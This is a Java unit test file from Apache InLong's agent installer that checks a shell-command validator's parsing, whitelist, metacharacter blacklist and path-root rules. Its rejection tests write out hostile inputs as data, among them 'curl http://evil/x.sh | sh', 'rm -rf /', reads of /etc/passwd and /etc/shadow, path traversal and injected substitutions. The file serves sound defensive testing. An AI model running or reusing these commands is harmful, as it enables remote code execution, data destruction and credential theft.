/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements. See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package installer;

import org.apache.inlong.agent.installer.conf.InstallerConfiguration;
import org.apache.inlong.agent.installer.validator.AllowedRootsResolver;
import org.apache.inlong.agent.installer.validator.CommandWhitelistResolver;
import org.apache.inlong.agent.installer.validator.ModuleCommandValidator;
import org.apache.inlong.agent.installer.validator.ModuleCommandValidator.ParsedSubCmd;
import org.apache.inlong.agent.installer.validator.ModuleCommandValidator.ValidationResult;

import org.junit.After;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;

import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.Set;

/* Unit tests for {@link ModuleCommandValidator}. */
public class ModuleCommandValidatorTest {

    private ModuleCommandValidator validator;
    private AllowedRootsResolver defaultRoots;

    @Before
    public void setUp() {
        /* Roots matching commands from Manager */
        String userHome = System.getProperty("user.home");
        Path inlongRoot = Paths.get(userHome, "inlong");
        Path tmpRoot = Paths.get(System.getProperty("java.io.tmpdir"));
        defaultRoots = AllowedRootsResolver.ofPaths(inlongRoot, tmpRoot);
        validator = new ModuleCommandValidator(defaultRoots);
    }

    @Test
    public void legal_startCommand_shouldPassAndBindWorkDir() {
        ValidationResult r = validator.validate("cd ~/inlong/inlong-agent/bin;sh agent.sh start");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        ParsedSubCmd sh = parsed.get(0);
        Assert.assertArrayEquals(new String[]{"sh", "agent.sh", "start"}, sh.getArgv());
        Assert.assertNotNull("cd should bind workDir", sh.getWorkDir());
        Assert.assertTrue(sh.getWorkDir().toString().endsWith("inlong/inlong-agent/bin"));
    }

    @Test
    public void legal_checkCommand_pipelineShouldSplit() {
        ValidationResult r = validator.validate(
                "ps aux | grep core.AgentMain | grep java | grep -v grep | awk '{print $2}'");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        ParsedSubCmd sub = parsed.get(0);
        Assert.assertTrue(sub.isPiped());
        List<String[]> pipeline = sub.getPipeline();
        Assert.assertEquals(5, pipeline.size());
        Assert.assertArrayEquals(new String[]{"ps", "aux"}, pipeline.get(0));
        Assert.assertArrayEquals(new String[]{"grep", "core.AgentMain"}, pipeline.get(1));
        Assert.assertArrayEquals(new String[]{"awk", "{print $2}"}, pipeline.get(4));
    }

    @Test
    public void legal_installCommand_multiSubShouldPass() {
        String cmd = "cd ~/inlong/inlong-agent/bin;sh agent.sh stop"
                + ";rm -rf ~/inlong/inlong-agent-temp"
                + ";mkdir -p ~/inlong/inlong-agent-temp"
                + ";cp -r ~/inlong/inlong-agent/.localdb ~/inlong/inlong-agent-temp";
        ValidationResult r = validator.validate(cmd);
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        /* cd absorbed as workDir, leaving 4 sub-commands: sh / rm / mkdir / cp */
        Assert.assertEquals(4, parsed.size());
        Assert.assertEquals("sh", parsed.get(0).getArgv()[0]);
        Assert.assertEquals("rm", parsed.get(1).getArgv()[0]);
        Assert.assertEquals("mkdir", parsed.get(2).getArgv()[0]);
        Assert.assertEquals("cp", parsed.get(3).getArgv()[0]);
        Assert.assertNotNull(parsed.get(0).getWorkDir());
    }

    /* cd applies to all subsequent subs until next cd (POSIX shell semantics) */
    @Test
    public void cd_shouldApplyToAllFollowingSubsUntilNextCd() {
        /* use tmp root from setUp() so path policy doesn't reject cd on macOS (/tmp symlink) */
        String tmp = Paths.get(System.getProperty("java.io.tmpdir")).toAbsolutePath().normalize().toString();
        String cmd = "cd " + tmp + ";mkdir " + tmp + "/e2e-cd-scope"
                + ";tar -xzvf " + tmp + "/dummy.tar.gz -C " + tmp + "/e2e-cd-scope";
        ValidationResult r = validator.validate(cmd);
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(2, parsed.size());
        Assert.assertEquals("mkdir", parsed.get(0).getArgv()[0]);
        Assert.assertEquals("tar", parsed.get(1).getArgv()[0]);
        Assert.assertNotNull("mkdir must inherit cd's workDir", parsed.get(0).getWorkDir());
        Assert.assertNotNull("tar must ALSO inherit cd's workDir (shell semantics)",
                parsed.get(1).getWorkDir());
        /* both must point to the same target, proving cd persists */
        Assert.assertEquals(parsed.get(0).getWorkDir(), parsed.get(1).getWorkDir());
        Assert.assertEquals(tmp, parsed.get(0).getWorkDir().toString());
    }

    /* later cd overrides earlier cd's workDir */
    @Test
    public void cd_shouldBeOverriddenByNextCd() {
        String userHome = System.getProperty("user.home");
        String tmp = Paths.get(System.getProperty("java.io.tmpdir")).toAbsolutePath().normalize().toString();
        String cmd = "cd " + userHome + "/inlong;mkdir " + userHome + "/inlong/a"
                + ";cd " + tmp + ";mkdir " + tmp + "/b";
        ValidationResult r = validator.validate(cmd);
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(2, parsed.size());
        Assert.assertEquals("mkdir", parsed.get(0).getArgv()[0]);
        Assert.assertEquals("mkdir", parsed.get(1).getArgv()[0]);
        /* 1st mkdir under ~/inlong ; 2nd under tmp */
        Assert.assertTrue(parsed.get(0).getWorkDir().toString().endsWith("inlong"));
        Assert.assertEquals(tmp, parsed.get(1).getWorkDir().toString());
        Assert.assertNotEquals(parsed.get(0).getWorkDir(), parsed.get(1).getWorkDir());
    }

    @Test
    public void illegal_curlPipe_shouldRejectByMetaChar() {
        /* "&&" hits metacharacter blacklist */
        ValidationResult r = validator.validate(
                "cd ~/inlong/inlong-agent/bin;sh agent.sh start && curl http://evil/x.sh | sh");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void illegal_rmSlash_shouldRejectByPath() {
        ValidationResult r = validator.validate("sh agent.sh start; rm -rf /");
        assertRejected(r, ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);
        Assert.assertTrue(r.getFailedSubCmd().contains("rm"));
    }

    @Test
    public void illegal_dollarParen_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo $(cat /etc/passwd)");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    /* P0: glob wildcards * and ? are rejected */

    @Test
    public void illegal_starWildcard_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("rm -rf ~/inlong/tmp/*.log");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
        Assert.assertTrue("reject message must mention the offending meta char '*', got: " + r.getMessage(),
                r.getMessage().contains("*"));
    }

    @Test
    public void illegal_questionMarkWildcard_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("rm -rf ~/inlong/tmp/log?.txt");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
        Assert.assertTrue("reject message must mention the offending meta char '?', got: " + r.getMessage(),
                r.getMessage().contains("?"));
    }

    @Test
    public void illegal_starInMiddleOfPath_shouldRejectByMetaChar() {
        /* glob buried inside path must still be rejected, else rm -rf ~/inlong/*\/logs no-ops */
        ValidationResult r = validator.validate("rm -rf ~/inlong/*/logs");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    /* P1: quote-aware split-by-';' and split-by-'|' */

    @Test
    public void semicolonInsideDoubleQuotes_shouldNotSplit() {
        ValidationResult r = validator.validate("echo \"hello;world\"");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals("';' inside double quotes must not split", 1, parsed.size());
        Assert.assertArrayEquals(new String[]{"echo", "hello;world"}, parsed.get(0).getArgv());
    }

    @Test
    public void semicolonInsideSingleQuotes_shouldNotSplit() {
        ValidationResult r = validator.validate("echo 'hello;world'");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        Assert.assertArrayEquals(new String[]{"echo", "hello;world"}, parsed.get(0).getArgv());
    }

    @Test
    public void pipeInsideDoubleQuotes_shouldNotSplitPipeline() {
        /* grep with regex alternation: "ERR|WARN" must not be parsed as pipeline */
        ValidationResult r = validator.validate("grep \"ERR|WARN\" ~/inlong/app.log");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        Assert.assertFalse("must NOT be parsed as a pipeline", parsed.get(0).isPiped());
        /* tokenizer preserves literal argv; tilde expansion deferred to path-policy check */
        Assert.assertArrayEquals(new String[]{"grep", "ERR|WARN", "~/inlong/app.log"},
                parsed.get(0).getArgv());
    }

    @Test
    public void pipeInsideSingleQuotes_shouldNotSplitPipeline() {
        ValidationResult r = validator.validate("grep 'foo|bar' ~/inlong/app.log");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        Assert.assertFalse(parsed.get(0).isPiped());
        Assert.assertArrayEquals(new String[]{"grep", "foo|bar", "~/inlong/app.log"},
                parsed.get(0).getArgv());
    }

    @Test
    public void mixedQuotedAndUnquotedSemicolons_shouldSplitOnlyTopLevel() {
        /* first ";" is real boundary, second ";" is inside quoted argv */
        ValidationResult r = validator.validate("echo one; echo \"two;three\"");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(2, parsed.size());
        Assert.assertArrayEquals(new String[]{"echo", "one"}, parsed.get(0).getArgv());
        Assert.assertArrayEquals(new String[]{"echo", "two;three"}, parsed.get(1).getArgv());
    }

    @Test
    public void mixedQuotedAndUnquotedPipes_shouldSplitOnlyTopLevel() {
        /* top-level "|" builds 2-stage pipeline; quoted "|" stays literal */
        ValidationResult r = validator.validate("echo hello | grep \"h|i\"");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        ParsedSubCmd sub = parsed.get(0);
        Assert.assertTrue("must be piped", sub.isPiped());
        List<String[]> pipeline = sub.getPipeline();
        Assert.assertEquals("exactly two pipe stages", 2, pipeline.size());
        Assert.assertArrayEquals(new String[]{"echo", "hello"}, pipeline.get(0));
        Assert.assertArrayEquals(new String[]{"grep", "h|i"}, pipeline.get(1));
    }

    @Test
    public void unterminatedQuote_shouldReject() {
        /* unterminated quote must fail validation rather than silently mis-parse */
        ValidationResult r = validator.validate("echo \"hello");
        assertRejected(r, ModuleCommandValidator.RULE_EMPTY_COMMAND);
    }

    @Test
    public void illegal_wget_shouldRejectByWhitelist() {
        ValidationResult r = validator.validate("sh agent.sh start; wget http://evil");
        assertRejected(r, ModuleCommandValidator.RULE_NOT_IN_WHITELIST);
    }

    @Test
    public void illegal_pathTraversal_shouldRejectByPath() {
        /* ~/inlong/../../../etc normalizes to /etc, outside all allowed roots */
        ValidationResult r = validator.validate("rm -rf ~/inlong/../../../etc");
        assertRejected(r, ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);
    }

    @Test
    public void illegal_shDashC_shouldRejectByForbiddenFlag() {
        /* avoid $( or && in payload so metacharacter check fires after -c check */
        ValidationResult r = validator.validate("sh -c echo hello");
        assertRejected(r, ModuleCommandValidator.RULE_FORBIDDEN_SH_C_FLAG);
    }

    @Test
    public void bashDashC_shouldAlsoBeRejected() {
        ValidationResult r = validator.validate("bash -c echo hello");
        assertRejected(r, ModuleCommandValidator.RULE_FORBIDDEN_SH_C_FLAG);
    }

    @Test
    public void extraAllowedRoots_shouldPermitCustomRoot() {
        /* without /opt/inlong: reject */
        ValidationResult r1 = validator.validate("rm -rf /opt/inlong/tmp");
        assertRejected(r1, ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);

        /* after adding /opt/inlong: accept */
        AllowedRootsResolver extended = AllowedRootsResolver.ofPaths(
                Paths.get(System.getProperty("user.home"), "inlong"),
                Paths.get(System.getProperty("java.io.tmpdir")),
                Paths.get("/opt/inlong"));
        ModuleCommandValidator extendedValidator = new ModuleCommandValidator(extended);
        ValidationResult r2 = extendedValidator.validate("rm -rf /opt/inlong/tmp");
        Assert.assertTrue("expected ok after adding /opt/inlong, got " + r2, r2.isOk());
    }

    @Test
    public void chmodNumericMode_shouldNotBeTreatedAsPath() {
        /* "755" has no slash, not treated as path; ~/inlong/... is under allowed root */
        ValidationResult r = validator.validate("chmod 755 ~/inlong/inlong-agent/bin/agent.sh");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
    }

    @Test
    public void emptyCommand_shouldReject() {
        assertRejected(validator.validate(""), ModuleCommandValidator.RULE_EMPTY_COMMAND);
        assertRejected(validator.validate("   "), ModuleCommandValidator.RULE_EMPTY_COMMAND);
    }

    @Test
    public void backtick_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo `id`");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void dollarBrace_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo ${HOME}");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void doublePipe_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("sh agent.sh stop || rm -rf /");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void backslash_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo hello\\ world");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void nullByte_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo foo\u0000bar");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void redirect_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("cat ~/inlong/a > ~/inlong/b");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void newline_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("sh agent.sh start\nrm -rf /");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    /* here-string "<<<": "<" on metacharacter blacklist */
    @Test
    public void hereString_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("grep foo <<< payload");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    /* process substitution "<(...)": "<" on metacharacter blacklist */
    @Test
    public void processSubstitution_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("grep foo <(cat ~/inlong/x)");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    /* variable-assignment prefix: "PATH=/tmp/evil" not on whitelist */
    @Test
    public void varAssignPrefix_shouldRejectByWhitelist() {
        ValidationResult r = validator.validate("PATH=/tmp/evil ls");
        assertRejected(r, ModuleCommandValidator.RULE_NOT_IN_WHITELIST);
    }

    /* append redirect ">>" on metacharacter blacklist */
    @Test
    public void appendRedirect_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo hi >> ~/inlong/log");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void expandTilde_shouldReplaceHomePrefixOnly() {
        String home = System.getProperty("user.home");
        Assert.assertEquals(home, ModuleCommandValidator.expandTilde("~"));
        Assert.assertEquals(home + "/foo", ModuleCommandValidator.expandTilde("~/foo"));
        Assert.assertEquals("/abs/path", ModuleCommandValidator.expandTilde("/abs/path"));
        /* only replace prefix tildes, not embedded ones */
        Assert.assertEquals("a~b", ModuleCommandValidator.expandTilde("a~b"));
    }

    /* Configurable whitelist tests */

    /* Reset config keys set during test so others see shipped defaults. */
    @After
    public void clearConfigOverrides() {
        InstallerConfiguration conf = InstallerConfiguration.getInstallerConf();
        conf.set(CommandWhitelistResolver.KEY_EXTRA_COMMAND_WHITELIST, "");
        conf.set(CommandWhitelistResolver.KEY_EXTRA_WRITE_LIKE_COMMANDS, "");
    }

    private ModuleCommandValidator newValidatorFromConf() {
        return new ModuleCommandValidator(defaultRoots, InstallerConfiguration.getInstallerConf());
    }

    @Test
    public void configExtraCommandWhitelist_shouldAllowCustomArgv0() {
        // 'nohup' is not in baseline; without configuration, it is rejected.
        ValidationResult before = validator.validate("nohup java -jar ~/inlong/x.jar");
        assertRejected(before, ModuleCommandValidator.RULE_NOT_IN_WHITELIST);

        // With extraCommandWhitelist=nohup it must pass.
        InstallerConfiguration.getInstallerConf()
                .set(CommandWhitelistResolver.KEY_EXTRA_COMMAND_WHITELIST, "nohup");
        ModuleCommandValidator v = newValidatorFromConf();
        ValidationResult after = v.validate("nohup java -jar ~/inlong/x.jar");
        Assert.assertTrue("expected ok after adding nohup, got " + after, after.isOk());
    }

    @Test
    public void configIllegalEntry_shouldBeSkippedButOthersKept() {
        // 'my;cmd' contains ';' and must be dropped; 'python3' is legal and must survive.
        InstallerConfiguration.getInstallerConf()
                .set(CommandWhitelistResolver.KEY_EXTRA_COMMAND_WHITELIST, "my;cmd,python3, echo bad ,ok_name");
        ModuleCommandValidator v = newValidatorFromConf();
        Set<String> effective = v.getEffectiveCommandWhitelist();
        Assert.assertFalse("entries containing ';' must be dropped", effective.contains("my;cmd"));
        Assert.assertFalse("entries containing whitespace must be dropped", effective.contains("echo bad"));
        Assert.assertTrue("well-formed 'python3' must be kept", effective.contains("python3"));
        Assert.assertTrue("well-formed 'ok_name' must be kept", effective.contains("ok_name"));
    }

    @Test
    public void configExtraWriteLikeCommand_shouldTriggerPathRootCheck() {
        // Make 'dd' both an allowed argv[0] and a write-like command; a path outside allowed
        // roots must now be rejected via PATH_NOT_UNDER_ALLOWED_ROOT rather than sneak past.
        InstallerConfiguration conf = InstallerConfiguration.getInstallerConf();
        conf.set(CommandWhitelistResolver.KEY_EXTRA_COMMAND_WHITELIST, "dd");
        conf.set(CommandWhitelistResolver.KEY_EXTRA_WRITE_LIKE_COMMANDS, "dd");
        ModuleCommandValidator v = newValidatorFromConf();

        Assert.assertTrue(v.getEffectiveCommandWhitelist().contains("dd"));
        Assert.assertTrue(v.getEffectiveWriteLikeCommands().contains("dd"));

        // 'if=/etc/shadow' contains '/', so looksLikePath treats it as a path argument for a
        // write-like command; because /etc/shadow is not under any allowed root, PATH check fires.
        assertRejected(v.validate("dd if=/etc/shadow of=/tmp-forbidden/x"),
                ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);
        // Same idea with a plain positional path argument.
        assertRejected(v.validate("dd /etc/shadow"),
                ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);

        // A path under an allowed root must pass.
        Assert.assertTrue(v.validate("dd " + Paths.get(System.getProperty("user.home"), "inlong", "x.bin"))
                .isOk());
    }

    @Test
    public void configExtraWriteLikeButNotWhitelisted_shouldWarnAndNotAffectBehavior() {
        // 'dd' is listed as write-like but never added to argv[0] whitelist. Behaviour must
        // stay identical to the baseline: 'dd' is rejected on the argv[0] whitelist step.
        InstallerConfiguration.getInstallerConf()
                .set(CommandWhitelistResolver.KEY_EXTRA_WRITE_LIKE_COMMANDS, "dd");
        ModuleCommandValidator v = newValidatorFromConf();
        Assert.assertFalse(v.getEffectiveCommandWhitelist().contains("dd"));
        // Effective write-like set contains the extra entry (the WARN is a hint, not a filter).
        Assert.assertTrue(v.getEffectiveWriteLikeCommands().contains("dd"));
        assertRejected(v.validate("dd /etc/shadow"),
                ModuleCommandValidator.RULE_NOT_IN_WHITELIST);
    }

    @Test
    public void configIntactBaseline_whenNoExtraProvided() {
        // No config touched → effective set must equal baseline exactly.
        ModuleCommandValidator v = newValidatorFromConf();
        Assert.assertEquals(CommandWhitelistResolver.BASELINE_COMMAND_WHITELIST,
                v.getEffectiveCommandWhitelist());
        Assert.assertEquals(CommandWhitelistResolver.BASELINE_WRITE_LIKE_COMMANDS,
                v.getEffectiveWriteLikeCommands());
    }

    /* --- helper --- */

    private void assertRejected(ValidationResult r, String expectedRule) {
        Assert.assertFalse("expected rejected, got " + r, r.isOk());
        Assert.assertEquals("rule name mismatch, msg=" + r.getMessage(),
                expectedRule, r.getRuleName());
    }
}
